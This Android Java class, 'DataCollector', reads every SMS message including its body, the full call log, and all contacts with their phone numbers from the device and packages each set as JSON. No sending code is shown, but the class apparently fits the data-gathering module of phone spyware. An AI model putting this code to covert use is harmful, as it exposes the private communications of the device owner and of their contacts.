// DataCollector.java
package com.your.app.service;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataCollector {
    
    public static String getSMSMessages() {
        JSONArray smsArray = new JSONArray();
        try {
            ContentResolver cr = AppContext.get().getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow("type")));
                    smsArray.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return smsArray.toString();
    }
    
    public static String getCallLogs() {
        JSONArray callArray = new JSONArray();
        try {
            ContentResolver cr = AppContext.get().getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, 
                CallLog.Calls.DATE + " DESC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    callArray.put(call);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return callArray.toString();
    }
    
    public static String getContacts() {
        JSONArray contactsArray = new JSONArray();
        try {
            ContentResolver cr = AppContext.get().getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, 
                null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("id", id);
                    contact.put("name", name);
                    
                    // Get phone numbers
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        
                        Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                        
                        JSONArray phones = new JSONArray();
                        while (pCur != null && pCur.moveToNext()) {
                            phones.put(pCur.getString(pCur.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        }
                        if (pCur != null) pCur.close();
                        contact.put("phones", phones);
                    }
                    contactsArray.put(contact);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return contactsArray.toString();
    }
}
